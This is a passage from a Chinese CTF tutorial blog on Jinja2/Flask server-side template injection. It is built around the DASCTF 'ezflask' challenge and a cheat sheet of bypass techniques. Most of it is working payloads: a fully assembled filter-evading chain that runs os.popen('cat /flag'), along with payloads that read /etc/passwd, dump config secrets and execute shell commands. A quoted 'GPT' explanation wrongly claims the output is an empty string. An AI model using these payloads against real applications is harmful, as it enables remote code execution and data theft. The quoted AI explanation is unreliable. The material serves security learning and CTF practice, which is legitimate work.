<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> org <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token operator">|</span>select<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>org<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># &lt;generator object select_or_reject at 0x0000020B2CA4EA20&gt;</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> org <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token operator">|</span>string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>org<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># &lt;TemplateReference None&gt;</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> org <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span>urlencode <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>org<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># %3CTemplateReference%20None%3E</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> org <span class="token operator">=</span> <span class="token punctuation">(</span>app<span class="token punctuation">.</span>__doc__<span class="token operator">|</span>string<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>org<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># Hello The default undefined type.  This undefined type can be printed and</span>
<span class="token comment">#    iterated over, but every other access will raise an :exc:`UndefinedError`:</span>
<span class="token comment">#</span>
<span class="token comment">#     &gt;&gt;&gt; foo = Undefined(name='foo')</span>
<span class="token comment">#     &gt;&gt;&gt; str(foo)</span>
<span class="token comment">#     ''</span>
<span class="token comment">#     &gt;&gt;&gt; not foo</span>
<span class="token comment">#     True</span>
<span class="token comment">#     &gt;&gt;&gt; foo + 42</span>
<span class="token comment">#     Traceback (most recent call last):</span>
<span class="token comment">#       ...</span>
<span class="token comment">#     jinja2.exceptions.UndefinedError: 'foo' is undefined</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> num <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>num<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># 0</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> num <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token operator">|</span>string<span class="token operator">|</span>length<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>num<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># 24</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> point <span class="token operator">=</span> self<span class="token operator">|</span><span class="token builtin">float</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">min</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>point<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># .</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过以上几种Payload，返回的字符串中包含尖括号、字母、空格、下划线、数字、空格、百分号、点号。<br>
我们的目标就是使用这些返回的字符串，结合各种过滤器，拼接出最终的Payload。</p>
<p><strong>GPT代码解释</strong></p>
<pre class="line-numbers language-none"><code class="language-none">这段代码是使用Jinja2模板语言的语法。让我逐步解释它的含义：

1. `{% set org = ... %}`: 这是Jinja2的赋值语句。它创建了一个名为"org"的变量，并将其赋值为接下来表达式的结果。

2. `({ }|select()|string())`: 这是一个表达式，由几个操作符组成。

   - `{ }`：这是一个空的字典对象。
   - `select()`：这是Jinja2的过滤器(filter)函数之一。`select()`函数用于选择字典中的项，但在这个例子中，字典是空的，所以它实际上没有进行任何选择。
   - `string()`：这是Jinja2的过滤器函数之一。`string()`函数将其输入转换为字符串类型。

3. `{{org}}`: 这是Jinja2的输出表达式。它会在模板中显示变量"org"的值。

综上所述，这段代码的作用是创建一个名为"org"的变量，并将其赋值为空字典经过选择和字符串转换后的结果。然后，它将"org"的值输出到模板中。由于选择和字符串转换操作并未改变空字典的内容，因此最终输出的结果将是一个空字符串。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>实战演示</strong></p>
<p><strong>[2020 DASCTF 八月安恒月赛]ezflask</strong></p>
<p>题目源码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> abort<span class="token punctuation">,</span> send_from_directory
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'attr'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span>
                     <span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token string">'session'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'add'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">,</span> <span class="token string">'ord'</span><span class="token punctuation">,</span> <span class="token string">'redirect'</span><span class="token punctuation">,</span> <span class="token string">'url_for'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'get_flashed_messages'</span><span class="token punctuation">,</span> <span class="token string">'get'</span><span class="token punctuation">,</span> <span class="token string">'subclasses'</span><span class="token punctuation">,</span> <span class="token string">'form'</span><span class="token punctuation">,</span> <span class="token string">'cookies'</span><span class="token punctuation">,</span> <span class="token string">'headers'</span><span class="token punctuation">,</span> <span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'{}'</span><span class="token punctuation">]</span>
        flag <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">for</span> no <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
            <span class="token keyword">if</span> no<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                flag <span class="token operator">=</span> <span class="token boolean">False</span>
                <span class="token keyword">break</span>
        <span class="token keyword">return</span> flag
    <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> safe_jinja<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        name <span class="token operator">=</span> <span class="token string">'wendell'</span>
    template <span class="token operator">=</span> <span class="token triple-quoted-string string">'''

    &lt;div class="center-content"&gt;
        &lt;p&gt;Hello, %s&lt;/p&gt;
    &lt;/div&gt;
    &lt;!--flag in /flag--&gt;
    &lt;!--python3.8--&gt;
'''</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。</p>
<p>在存在ssti的地方执行如下payload：</p>
<pre class="line-numbers language-none"><code class="language-none">{% set org = ({ }|select()|string()) %}{{org}}
# 或 {% set org = ({ }|select|string) %}{{org}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622174910753.png" alt="image-20230622174910753"></p>
<p>可以看到，我们得到了一段字符串：<code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code>，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串中取到我们想要的字符，从而绕过过滤。</p>
<p>然后我们在使用list()过滤器将字符串转化为列表：</p>
<pre class="line-numbers language-none"><code class="language-none">{% set orglst = ({ }|select|string|list) %}{{orglst}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622174919961.png" alt="image-20230622174919961"></p>
<p>如上图所示，反回了一个列表，列表中是 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 <code>_</code>：</p>
<pre class="line-numbers language-none"><code class="language-none">{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622174927675.png" alt="image-20230622174927675"></p>
<p>同理还能取到更多的字符：</p>
<pre class="line-numbers language-none"><code class="language-none">{% set space = (({ }|select|string|list).pop(10)|string) %}{{spa}}    # 空格
{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _
{% set zero = (({ }|select|string|list).pop(38)|int) %}{{zero}}    # 0
{% set seven = (({ }|select|string|list).pop(40)|int) %}{{seven}}    # 7
......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：</p>
<pre class="line-numbers language-none"><code class="language-none">{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
{% set one = (zero**zero)|int %}{{one}}    # 1
{%set two = (zero-one-one)|abs %}    # 2
{%set three = (zero-one-one-one)|abs %}    # 3
{% set five = (two*two*two)-one-one-one %}    # 5
#  {%set four = (one+three) %}    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了
......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622174941520.png" alt="image-20230622174941520"></p>
<p>通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：</p>
<pre class="line-numbers language-none"><code class="language-none"># 首先构造出所需的数字:
{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
{% set one = (zero**zero)|int %}    # 1
{% set two = (zero-one-one)|abs %}    # 2
{% set four = (two*two)|int %}    # 4
{% set five = (two*two*two)-one-one-one %}    # 5
{% set seven = (zero-one-one-five)|abs %}    # 7

# 构造出所需的各种字符与字符串:
{% set xhx = (({ }|select|string|list).pop(24)|string) %}    # _
{% set space = (({ }|select|string|list).pop(10)|string) %}    # 空格
{% set point = ((app.__doc__|string|list).pop(26)|string) %}    # .
{% set yin = ((app.__doc__|string|list).pop(195)|string) %}    # 单引号 '
{% set left = ((app.__doc__|string|list).pop(189)|string) %}    # 左括号 (
{% set right = ((app.__doc__|string|list).pop(200)|string) %}    # 右括号 )

{% set c = dict(c=aa)|reverse|first %}    # 字符 c
{% set bfh = self|string|urlencode|first %}    # 百分号 %
{% set bfhc=bfh~c %}    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
{% set slas = bfhc%((four~seven)|int) %}    # 使用%c构造斜杠 /
{% set but = dict(buil=aa,tins=dd)|join %}    # builtins
{% set imp = dict(imp=aa,ort=dd)|join %}    # import
{% set pon = dict(po=aa,pen=dd)|join %}    # popen
{% set os = dict(o=aa,s=dd)|join %}    # os
{% set ca = dict(ca=aa,t=dd)|join %}    # cat
{% set flg = dict(fl=aa,ag=dd)|join %}    # flag
{% set ev = dict(ev=aa,al=dd)|join %}    # eval
{% set red = dict(re=aa,ad=dd)|join %}    # read
{% set bul = xhx*2~but~xhx*2 %}    # __builtins__<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将上面构造的字符或字符串拼接起来构造出 <code>__import__('os').popen('cat /flag').read()</code>：</p>
<pre class="line-numbers language-none"><code class="language-none">{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622174953687.png" alt="image-20230622174953687"></p>
<p>如上图所示，成功构造出了 <code>__import__('os').popen('cat /flag').read()</code> 。</p>
<p>然后将上面构造的各种变量添加到SSTI万能payload里面就行了：</p>
<pre class="line-numbers language-none"><code class="language-none">{% for f,v in whoami.__init__.__globals__.items() %}    # globals
    {% if f == bul %} 
        {% for a,b in v.items() %}    # builtins
            {% if a == ev %}    # eval
                {{b(pld)}}    # eval("__import__('os').popen('cat /flag').read()")
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以最终的payload为：</p>
<pre class="line-numbers language-none"><code class="language-none">{% set zero = (({ }|select|string|list).pop(38)|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs|int %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set seven = (zero-one-one-five)|abs %}{% set xhx = (({ }|select|string|list).pop(24)|string) %}{% set space = (({ }|select|string|list).pop(10)|string) %}{% set point = ((app.__doc__|string|list).pop(26)|string) %}{% set yin = ((app.__doc__|string|list).pop(195)|string) %}{% set left = ((app.__doc__|string|list).pop(189)|string) %}{% set right = ((app.__doc__|string|list).pop(200)|string) %}{% set c = dict(c=aa)|reverse|first %}{% set bfh=self|string|urlencode|first %}{% set bfhc=bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set os = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx*2~but~xhx*2 %}{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in whoami.__init__.__globals__.items() %}{% if f == bul %}{% for a,b in v.items() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622175015233.png" alt="image-20230622175015233"></p>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584">https://xz.aliyun.com/t/9584</a></p>
<h3 id="2-6-一些姿势">2.6 一些姿势</h3>
<h4 id="1-config">1. config</h4>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">{</span><span class="token punctuation">{</span>config<span class="token punctuation">}</span><span class="token punctuation">}</span> 可以获取当前设置，如果题目类似 app.config [<span class="token string">'FLAG'</span>] =
os.environ.pop（<span class="token string">'FLAG'</span>） ，那可以直接访问 <span class="token punctuation">{</span><span class="token punctuation">{</span>config[<span class="token string">'FLAG'</span>]<span class="token punctuation">}</span><span class="token punctuation">}</span> 或者 <span class="token punctuation">{</span><span class="token punctuation">{</span>config.FLAG<span class="token punctuation">}</span><span class="token punctuation">}</span> 得到flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="2-self">2. self</h4>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">{</span><span class="token punctuation">{</span>self<span class="token punctuation">}</span><span class="token punctuation">}</span> ⇒ &lt;TemplateReference None&gt;
<span class="token punctuation">{</span><span class="token punctuation">{</span>self.__dict__._TemplateReference__context.config<span class="token punctuation">}</span><span class="token punctuation">}</span> ⇒ 同样可以找到config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="3-“”-、-、-等数据结构">3.  “” 、 [] 、 () 等数据结构</h4>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">主要目的是配合 __class__.__mro__[2] 这样找到 object 类
<span class="token punctuation">{</span><span class="token punctuation">{</span>[].__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
[68].__init__.__globals__[<span class="token string">'os'</span>].__dict__.environ[<span class="token string">'FLAG'</span>]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="4、url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-cycler-joiner-config等">4、url_for, g, request, namespace, lipsum, range, session, dict,get_flashed_messages, cycler, joiner, config等</h4>
<p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app<br>
等）。<br>
例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">{</span><span class="token punctuation">{</span>url_for.__globals__[<span class="token string">'current_app'</span>].config.FLAG<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>get_flashed_messages.__globals__[<span class="token string">'current_app'</span>].config.FLAG<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>request.application.__self__._get_data_for_json.__globals__[<span class="token string">'json'</span>].JSONEncode
r.default.__globals__[<span class="token string">'current_app'</span>].config[<span class="token string">'FLAG'</span>]<span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="5-在URL执行py命令格式">5. 在URL执行py命令格式</h4>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">{</span>%这是内容%<span class="token punctuation">}</span>
<span class="token property">eg</span><span class="token punctuation">:</span>
<span class="token punctuation">{</span>% for c in [].__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> %<span class="token punctuation">}</span>
<span class="token punctuation">{</span>% if c.__name__==<span class="token string">'file'</span> %<span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span>.<span class="token function">readlines</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span>% endif %<span class="token punctuation">}</span>
<span class="token punctuation">{</span>% endfor %<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="2-7-常用到的payload">2.7 常用到的payload</h3>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">name=<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__mro__[-1].__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[132].__init__.__globals__[<span class="token string">'popen'</span>]<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span>.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>   <span class="token comment">//132是os模块</span>

name=<span class="token punctuation">{</span><span class="token punctuation">{</span> config.__class__.__init__.__globals__[<span class="token string">'os'</span>].<span class="token function">popen</span><span class="token punctuation">(</span><span class="token string">'cat ../flag'</span><span class="token punctuation">)</span>.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>   <span class="token comment">//大佬经常用的config直接出</span>
在导入不了具体哪个子类例如132的时候，可以用__bulit__重新导入Os模块然后进行命令执行

name=<span class="token punctuation">{</span><span class="token punctuation">{</span>x.__init__.__globals__[<span class="token string">'__builtins__'</span>].<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("cat /flag").read()'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
当然如果遇到过了了敏感字符，记得自己去拼接一下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注入顺序：先找到一个类型所属的对象–&gt;在找到这个对象所继承的基类–&gt;他的功能是谁传授给他的(‘找到他父亲’)–&gt;他父亲除了有这个子类，还有其他的子类呗，这里的类，就包括很多的方法了，比如我们最需要用到的就是，OS模块来命令执行–&gt;找到OS类了，将这个类初始化成方法，相当于我们调用了OS模块–&gt;通过globals保存对全局变量的引用，然后再用OS模块进行命令执行</p>
<h4 id="SSTI常用的语句格式">SSTI常用的语句格式</h4>
<pre class="line-numbers language-none"><code class="language-none">{{5*5}} 直接执行
{% set a="test" %}{{a}}      //设置变量
{% for i in ['t ','e ','s ','t '] %}{{i}}{%endfor%}  //执行循环  --&gt;别忘了中间那个{{i}}
{% if 25==5*5 %}{{"success"}}{% endif %}  //条件执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="绕过SSTI过滤">绕过SSTI过滤</h4>
<p>再读了一部分的文章，再结合自己的做题情况来看，对SSTI考点总结如下：</p>
<pre class="line-numbers language-none"><code class="language-none">1.过滤一些字符–&gt;绕过即可
2.寻找模块进行命令执行
主要是对第一个过滤的考察，比如说：对字符串进行拼接绕过，编码绕过，format、char等绕过拼接，通过getattribute等函数替代符号的效果,通过request的方法进行传参，通过%set的方法
我们知道在SSTI中用到的符号无非就是： .   __   ()   []   ‘’   五种<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="符号的过滤">符号的过滤</h4>
<pre class="line-numbers language-none"><code class="language-none">访问变量属性： . [] getattribute

标准的python语法使用点（.）外，还可以使用中括号（[]）来访问变量的属性,也可以使用attr来访问变量的属性。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="过滤了点号">过滤了点号</h4>
<pre class="line-numbers language-none"><code class="language-none">{{().__class__ }}等同于{{()['__class__']}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318161346546.png" alt="image-20230318161346546"></p>
<pre class="line-numbers language-none"><code class="language-none">""|attr("__class__")
相当于
"".__class__<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="过滤了中括号">过滤了中括号</h4>
<p>还有一些其他的访问方法：pop get getitem:</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">{</span><span class="token punctuation">{</span>url_for.__globals__[<span class="token string">'__builtins__'</span>]<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>url_for.__globals__.__getitem__<span class="token punctuation">(</span><span class="token string">'__builtins__'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>url_for.__globals__.<span class="token function">pop</span><span class="token punctuation">(</span><span class="token string">'__builtins__'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>url_for.__globals__.<span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'__builtins__'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>url_for.__globals__.<span class="token function">setdefault</span><span class="token punctuation">(</span><span class="token string">'__builtins__'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318161452566.png" alt="image-20230318161452566"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span>.class<span class="token punctuation">}</span><span class="token punctuation">}</span>==<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span>[[cla<span class="token punctuation">,</span>ss]|join]<span class="token punctuation">}</span><span class="token punctuation">}</span>   <span class="token comment">//这是拼接绕过</span>

<span class="token string">"__cladd__"</span>|<span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"dd"</span><span class="token punctuation">,</span><span class="token string">"ss"</span><span class="token punctuation">)</span>     <span class="token comment">// "__class__"   //这是替代</span>

“ssalc”[<span class="token punctuation">:</span><span class="token punctuation">:</span>-1]
<span class="token string">""</span>[<span class="token string">"__ssalc__"</span>][<span class="token punctuation">:</span><span class="token punctuation">:</span>-1]
<span class="token string">""</span>.__getattribute__<span class="token punctuation">(</span><span class="token string">"__ssalc__"</span>[<span class="token punctuation">:</span><span class="token punctuation">:</span>-1]<span class="token punctuation">)</span>    <span class="token comment">//这是反转</span>

<span class="token string">""</span>[<span class="token string">"__CLASS__"</span>.<span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span>]     <span class="token comment">//这是大小写转换</span>

<span class="token string">"__class__"</span>==<span class="token string">"\x5f\x5fclass\x5f\x5f"</span>==<span class="token string">"\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"</span>

对于python2的话，还可以利用base64进行绕过

<span class="token string">"__class__"</span>==<span class="token punctuation">(</span><span class="token string">"X19jbGFzc19f"</span><span class="token punctuation">)</span>.<span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"base64"</span><span class="token punctuation">)</span>        <span class="token comment">//这是编码绕过</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="2-8-脚本">2.8 脚本</h3>
<h4 id="1-寻找内建函数-eval-执行命令">1. 寻找内建函数 eval 执行命令</h4>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
